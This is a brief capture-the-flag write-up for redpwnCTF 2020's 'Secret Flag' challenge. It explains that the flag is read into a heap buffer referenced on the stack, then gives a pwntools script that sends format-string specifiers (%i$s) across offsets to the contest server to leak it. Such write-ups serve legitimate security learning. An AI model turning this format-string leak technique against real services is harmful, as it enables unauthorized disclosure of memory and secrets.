# Secret Flag

From the desc we know it's a format string. There's no symbol for main, so i opened it up in radare2. 

It opens mallocs a heap address, stores it on the stack, opens `flag.txt`, and reads it to that heap address. We can use the format specifier %s to read the flag by referencing this heap address. 

I didn't bother actually calculating the offset and just bruteforced it.

```python
from pwn import *
for i in range(30):
    tosend = f"%{i}$s"
    p = remote('2020.redpwnc.tf', 31826)
    p.recvlines(2)
    p.sendline(tosend)
    try:
        print(p.recvline())
    except:
        pass
    p.close()
```
